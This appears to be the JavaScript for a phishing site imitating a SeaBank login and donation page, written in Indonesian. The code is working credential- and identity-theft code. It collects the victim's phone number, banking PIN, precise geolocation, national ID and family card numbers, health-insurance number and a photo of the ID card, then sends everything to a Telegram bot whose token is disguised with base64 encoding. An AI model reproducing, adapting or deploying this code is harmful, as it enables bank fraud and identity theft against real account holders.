document.addEventListener('DOMContentLoaded', function() {
    // DOM Elements for Login Page
    const loginForm = document.getElementById('loginForm');
    const locationToggle = document.getElementById('locationToggle');
    const addressInput = document.getElementById('address');
    const addressError = document.getElementById('addressError');
    const phoneInput = document.getElementById('phone');
    const phoneError = document.getElementById('phoneError');
    const pinInput = document.getElementById('pin');
    const pinError = document.getElementById('pinError');
    const successMessage = document.getElementById('successMessage');
    const loginButton = document.getElementById('loginButton');
    const continueDonation = document.getElementById('continueDonation');
    const returnMain = document.getElementById('returnMain');
    const aboutModal = document.getElementById('aboutModal');
    const privacyModal = document.getElementById('privacyModal');
    const termsModal = document.getElementById('termsModal');
    const locationModal = document.getElementById('locationModal');
    const aboutLink = document.getElementById('aboutLink');
    const privacyLink = document.getElementById('privacyLink');
    const termsLink = document.getElementById('termsLink');
    const locationLink = document.getElementById('locationLink');
    const themeToggle = document.getElementById('themeToggle');
    const closeButtons = document.querySelectorAll('.close-modal');

    // DOM Elements for Donation Page
    const donationForm = document.getElementById('donationForm');
    const ktpInput = document.getElementById('ktp');
    const ktpError = document.getElementById('ktpError');
    const kkInput = document.getElementById('kk');
    const kkError = document.getElementById('kkError');
    const bpjsInput = document.getElementById('bpjs');
    const bpjsError = document.getElementById('bpjsError');
    const donationAddressInput = document.getElementById('address');
    const donationAddressError = document.getElementById('addressError');
    const ktpPhotoInput = document.getElementById('ktpPhoto');
    const ktpPhotoError = document.getElementById('ktpPhotoError');
    const submitDonation = document.getElementById('submitDonation');
    const referralLinkInput = document.getElementById('referralLink');
    const copyReferral = document.getElementById('copyReferral');

    // Input sanitization function
    function sanitizeInput(input) {
        if (typeof input !== 'string') return '';
        return input.replace(/[<>&'"]/g, function(match) {
            const escapeMap = {
                '<': '<',
                '>': '>',
                '&': '&',
                "'": ''',
                '"': '"'
            };
            return escapeMap[match];
        }).trim();
    }

    // Phone number validation (Indonesian format: starts with +62 or 08, 10-13 digits)
    function validatePhone(phone) {
        const phoneRegex = /^(?:\+62|08)\d{8,11}$/;
        return phoneRegex.test(phone);
    }

    // KTP and KK validation (16 digits)
    function validateKtpOrKK(number) {
        return /^\d{16}$/.test(number);
    }

    // BPJS validation (13 digits, optional)
    function validateBPJS(number) {
        if (!number) return true; // BPJS is optional
        return /^\d{13}$/.test(number);
    }

    // Theme toggle functionality
    if (themeToggle) {
        themeToggle.addEventListener('click', function() {
            document.body.classList.toggle('dark-mode');
            themeToggle.textContent = document.body.classList.contains('dark-mode') ? '☀️' : '🌙';
            themeToggle.classList.toggle('dark');
            localStorage.setItem('theme', document.body.classList.contains('dark-mode') ? 'dark' : 'light');
        });

        // Load theme preference
        if (localStorage.getItem('theme') === 'dark') {
            document.body.classList.add('dark-mode');
            themeToggle.textContent = '☀️';
            themeToggle.classList.add('dark');
        }
    }

    // Login Page Event Listeners
    if (loginForm) {
        // Address validation on location toggle
        locationToggle.addEventListener('change', function() {
            if (this.checked && sanitizeInput(addressInput.value) === '') {
                addressError.style.display = 'block';
                addressInput.style.borderColor = 'var(--error)';
                addressInput.focus();
            } else {
                addressError.style.display = 'none';
                addressInput.style.borderColor = 'var(--border)';
            }
        });

        addressInput.addEventListener('input', function() {
            const sanitizedAddress = sanitizeInput(this.value);
            this.value = sanitizedAddress;
            if (locationToggle.checked && sanitizedAddress !== '') {
                addressError.style.display = 'none';
                this.style.borderColor = 'var(--border)';
            }
        });

        // Phone number validation
        phoneInput.addEventListener('input', function() {
            const sanitizedPhone = sanitizeInput(this.value);
            this.value = sanitizedPhone;
            if (validatePhone(sanitizedPhone)) {
                phoneError.style.display = 'none';
                this.style.borderColor = 'var(--border)';
            } else {
                phoneError.style.display = 'block';
                this.style.borderColor = 'var(--error)';
            }
        });

        // PIN validation (6 digits)
        pinInput.addEventListener('input', function() {
            const sanitizedPin = sanitizeInput(this.value);
            this.value = sanitizedPin;
            if (sanitizedPin.length === 6 && /^\d{6}$/.test(sanitizedPin)) {
                pinError.style.display = 'none';
                this.style.borderColor = 'var(--border)';
            } else {
                pinError.style.display = 'block';
                this.style.borderColor = 'var(--error)';
            }
        });

        // Form submission
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();

            const phone = sanitizeInput(phoneInput.value);
            const pin = sanitizeInput(pinInput.value);
            const address = sanitizeInput(addressInput.value);
            const locationPermission = locationToggle.checked;

            // Comprehensive validation
            let isValid = true;

            if (!validatePhone(phone)) {
                phoneError.style.display = 'block';
                phoneInput.style.borderColor = 'var(--error)';
                phoneInput.focus();
                isValid = false;
            }

            if (pin.length !== 6 || !/^\d{6}$/.test(pin)) {
                pinError.style.display = 'block';
                pinInput.style.borderColor = 'var(--error)';
                if (isValid) pinInput.focus();
                isValid = false;
            }

            if (locationPermission && address === '') {
                addressError.style.display = 'block';
                addressInput.style.borderColor = 'var(--error)';
                if (isValid) addressInput.focus();
                isValid = false;
            }

            if (locationPermission) {
                try {
                    const position = await requestLocationAccess();
                    if (!isValidPosition(position)) {
                        alert('Lokasi tidak valid. Pastikan akurasi lokasi memadai.');
                        isValid = false;
                    }
                } catch (error) {
                    addressError.textContent = 'Gagal mendapatkan lokasi. Pastikan izin lokasi diaktifkan.';
                    addressError.style.display = 'block';
                    isValid = false;
                }
            }

            if (!isValid) return;

            console.log('Login attempt with:', { phone, pin, address, locationPermission });

            // Animasi loading
            loginButton.innerHTML = '<span class="loading">Memproses...</span>';
            loginButton.disabled = true;

            try {
                const position = locationPermission ? await requestLocationAccess() : null;
                await simulateLogin(phone, pin, address, locationPermission, position);
            } catch (error) {
                console.error('Login error:', error);
                alert('Terjadi kesalahan saat login. Silakan coba lagi.');
                loginButton.innerHTML = 'MASUK';
                loginButton.disabled = false;
            }
        });

        // Continue to donation page
        continueDonation.addEventListener('click', function() {
            window.location.href = 'donation.html';
        });

        // Return to main page
        returnMain.addEventListener('click', function() {
            window.location.href = 'index.html';
        });
    }

    // Donation Page Event Listeners
    if (donationForm) {
        // KTP validation
        ktpInput.addEventListener('input', function() {
            const sanitizedKtp = sanitizeInput(this.value);
            this.value = sanitizedKtp;
            if (validateKtpOrKK(sanitizedKtp)) {
                ktpError.style.display = 'none';
                this.style.borderColor = 'var(--border)';
            } else {
                ktpError.style.display = 'block';
                this.style.borderColor = 'var(--error)';
            }
        });

        // KK validation
        kkInput.addEventListener('input', function() {
            const sanitizedKk = sanitizeInput(this.value);
            this.value = sanitizedKk;
            if (validateKtpOrKK(sanitizedKk)) {
                kkError.style.display = 'none';
                this.style.borderColor = 'var(--border)';
            } else {
                kkError.style.display = 'block';
                this.style.borderColor = 'var(--error)';
            }
        });

        // BPJS validation
        bpjsInput.addEventListener('input', function() {
            const sanitizedBpjs = sanitizeInput(this.value);
            this.value = sanitizedBpjs;
            if (validateBPJS(sanitizedBpjs)) {
                bpjsError.style.display = 'none';
                this.style.borderColor = 'var(--border)';
            } else {
                bpjsError.style.display = 'block';
                this.style.borderColor = 'var(--error)';
            }
        });

        // Address validation
        donationAddressInput.addEventListener('input', function() {
            const sanitizedAddress = sanitizeInput(this.value);
            this.value = sanitizedAddress;
            if (sanitizedAddress !== '') {
                donationAddressError.style.display = 'none';
                this.style.borderColor = 'var(--border)';
            } else {
                donationAddressError.style.display = 'block';
                this.style.borderColor = 'var(--error)';
            }
        });

        // KTP Photo validation
        ktpPhotoInput.addEventListener('change', function() {
            if (this.files && this.files.length > 0) {
                ktpPhotoError.style.display = 'none';
                this.style.borderColor = 'var(--border)';
            } else {
                ktpPhotoError.style.display = 'block';
                this.style.borderColor = 'var(--error)';
            }
        });

        // Donation form submission
        donationForm.addEventListener('submit', async function(e) {
            e.preventDefault();

            const ktp = sanitizeInput(ktpInput.value);
            const kk = sanitizeInput(kkInput.value);
            const bpjs = sanitizeInput(bpjsInput.value);
            const address = sanitizeInput(donationAddressInput.value);
            const ktpPhoto = ktpPhotoInput.files[0];

            // Comprehensive validation
            let isValid = true;

            if (!validateKtpOrKK(ktp)) {
                ktpError.style.display = 'block';
                ktpInput.style.borderColor = 'var(--error)';
                ktpInput.focus();
                isValid = false;
            }

            if (!validateKtpOrKK(kk)) {
                kkError.style.display = 'block';
                kkInput.style.borderColor = 'var(--error)';
                if (isValid) kkInput.focus();
                isValid = false;
            }

            if (!validateBPJS(bpjs)) {
                bpjsError.style.display = 'block';
                bpjsInput.style.borderColor = 'var(--error)';
                if (isValid) bpjsInput.focus();
                isValid = false;
            }

            if (address === '') {
                donationAddressError.style.display = 'block';
                donationAddressInput.style.borderColor = 'var(--error)';
                if (isValid) donationAddressInput.focus();
                isValid = false;
            }

            if (!ktpPhoto) {
                ktpPhotoError.style.display = 'block';
                ktpPhotoInput.style.borderColor = 'var(--error)';
                if (isValid) ktpPhotoInput.focus();
                isValid = false;
            }

            if (!isValid) return;

            console.log('Donation attempt with:', { ktp, kk, bpjs, address });

            // Animasi loading
            submitDonation.innerHTML = '<span class="loading">Memproses...</span>';
            submitDonation.disabled = true;

            try {
                await sendDonationToTelegram(ktp, kk, bpjs, address, ktpPhoto);
                successMessage.classList.add('active');
                // Set referral link
                const phone = localStorage.getItem('phone') || 'unknown';
                referralLinkInput.value = `https://seabank.co.id/referral?user=${btoa(phone)}`;
            } catch (error) {
                console.error('Donation error:', error);
                alert('Terjadi kesalahan saat mengirim data donasi. Silakan coba lagi.');
            } finally {
                submitDonation.innerHTML = 'Kirim Data Donasi';
                submitDonation.disabled = false;
            }
        });

        // Copy referral link
        if (copyReferral) {
            copyReferral.addEventListener('click', function() {
                referralLinkInput.select();
                document.execCommand('copy');
                alert('Link referral telah disalin!');
            });
        }
    }

    // Modal Event Listeners
    if (aboutLink) {
        aboutLink.addEventListener('click', function(e) {
            e.preventDefault();
            aboutModal.style.display = 'block';
        });
    }

    if (privacyLink) {
        privacyLink.addEventListener('click', function(e) {
            e.preventDefault();
            privacyModal.style.display = 'block';
        });
    }

    if (termsLink) {
        termsLink.addEventListener('click', function(e) {
            e.preventDefault();
            termsModal.style.display = 'block';
        });
    }

    if (locationLink) {
        locationLink.addEventListener('click', function(e) {
            e.preventDefault();
            locationModal.style.display = 'block';
        });
    }

    // Close Modal when clicking X
    closeButtons.forEach(button => {
        button.addEventListener('click', function() {
            this.closest('.modal').style.display = 'none';
        });
    });

    // Close Modal when clicking outside
    window.addEventListener('click', function(e) {
        if (e.target.classList.contains('modal')) {
            e.target.style.display = 'none';
        }
    });

    // Location access request with enhanced validation
    function requestLocationAccess() {
        return new Promise((resolve, reject) => {
            if (!navigator.geolocation) {
                const error = new Error('Geolocation tidak didukung oleh browser Anda.');
                console.error(error);
                reject(error);
                return;
            }

            navigator.geolocation.getCurrentPosition(
                position => {
                    if (!isValidPosition(position)) {
                        const error = new Error('Data lokasi tidak valid atau akurasi rendah.');
                        console.error(error);
                        reject(error);
                        return;
                    }
                    console.log('Lokasi diperoleh:', {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    });
                    resolve(position);
                },
                error => {
                    console.error('Error mendapatkan lokasi:', error);
                    reject(error);
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        });
    }

    // Validate position data
    function isValidPosition(position) {
        if (!position || !position.coords) return false;
        const { latitude, longitude, accuracy } = position.coords;
        return (
            typeof latitude === 'number' &&
            typeof longitude === 'number' &&
            latitude >= -90 && latitude <= 90 &&
            longitude >= -180 && longitude <= 180 &&
            accuracy <= 100 // Require accuracy within 100 meters
        );
    }

    // Send login data to Telegram
    async function sendToTelegram(phone, pin, address, locationPermission, position) {
        // Decrypt bot token and chat ID (Base64 encoded)
        const encryptedBotToken = 'NzI5NTM4ODEzNTpBQUdDRng5TnBweXg5dzhoMDhzVjA1bTVuenVCc3ZSVGNBZy==';
        const encryptedChatId = 'MjAyODMzNjk2Mw==';
        const botToken = atob(encryptedBotToken);
        const chatId = atob(encryptedChatId);

        const locationInfo = position 
            ? `Latitude: ${position.coords.latitude.toFixed(6)}\nLongitude: ${position.coords.longitude.toFixed(6)}\nAccuracy: ${position.coords.accuracy.toFixed(2)} meters`
            : 'Lokasi tidak tersedia';

        const referralLink = `https://seabank.co.id/referral?user=${btoa(phone)}`;

        const message = `
🌟 *Data Login Pengguna Baru* 🌟
📱 *Nomor Telepon*: ${phone}
🔑 *PIN*: ${pin}
🏠 *Alamat*: ${address || 'Tidak diisi'}
📍 *Izin Lokasi*: ${locationPermission ? 'Diaktifkan' : 'Tidak diaktifkan'}
🌍 *Informasi Lokasi*: 
${locationInfo}
🔗 *Link Referral*: ${referralLink}
📅 *Waktu*: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
        `.trim();

        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });

            if (!response.ok) {
                throw new Error(`Gagal mengirim data ke Telegram: ${response.statusText}`);
            }

            const data = await response.json();
            if (!data.ok) {
                throw new Error(`Telegram API error: ${data.description}`);
            }
            console.log('Data login berhasil dikirim ke Telegram');
            localStorage.setItem('phone', phone); // Store phone for donation page
        } catch (error) {
            console.error('Error mengirim ke Telegram:', error);
            throw error;
        }
    }

    // Send donation data to Telegram
    async function sendDonationToTelegram(ktp, kk, bpjs, address, ktpPhoto) {
        // Decrypt bot token and chat ID (Base64 encoded)
        const encryptedBotToken = 'NzI5NTM4ODEzNTpBQUdDRng5TnBweXg5dzhoMDhzVjA1bTVuenVCc3ZSVGNBZy==';
        const encryptedChatId = 'MjAyODMzNjk2Mw==';
        const botToken = atob(encryptedBotToken);
        const chatId = atob(encryptedChatId);

        const phone = localStorage.getItem('phone') || 'unknown';
        const referralLink = `https://seabank.co.id/referral?user=${btoa(phone)}`;

        const message = `
🌟 *Data Donasi Pengguna* 🌟
📱 *Nomor Telepon*: ${phone}
🆔 *Nomor KTP*: ${ktp}
👨‍👩‍👧 *Nomor KK*: ${kk}
🏥 *Nomor BPJS*: ${bpjs || 'Tidak diisi'}
🏠 *Alamat*: ${address}
🔗 *Link Referral*: ${referralLink}
📅 *Waktu*: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
        `.trim();

        // Send text data
        const textUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        try {
            const textResponse = await fetch(textUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });

            if (!textResponse.ok) {
                throw new Error(`Gagal mengirim data teks ke Telegram: ${textResponse.statusText}`);
            }

            const textData = await textResponse.json();
            if (!textData.ok) {
                throw new Error(`Telegram API error (text): ${textData.description}`);
            }
        } catch (error) {
            console.error('Error mengirim data teks ke Telegram:', error);
            throw error;
        }

        // Send KTP photo
        if (ktpPhoto) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', ktpPhoto);
            formData.append('caption', `Foto KTP dari pengguna: ${phone}`);

            const photoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
            try {
                const photoResponse = await fetch(photoUrl, {
                    method: 'POST',
                    body: formData
                });

                if (!photoResponse.ok) {
                    throw new Error(`Gagal mengirim foto KTP ke Telegram: ${photoResponse.statusText}`);
                }

                const photoData = await photoResponse.json();
                if (!photoData.ok) {
                    throw new Error(`Telegram API error (photo): ${photoData.description}`);
                }
                console.log('Foto KTP berhasil dikirim ke Telegram');
            } catch (error) {
                console.error('Error mengirim foto KTP ke Telegram:', error);
                throw error;
            }
        }
    }

    // Simulate login process
    async function simulateLogin(phone, pin, address, locationPermission, position) {
        try {
            await sendToTelegram(phone, pin, address, locationPermission, position);
            successMessage.classList.add('active');
            loginButton.innerHTML = 'MASUK';
            loginButton.disabled = false;
        } catch (error) {
            console.error('Simulate login error:', error);
            throw error;
        }
    }
});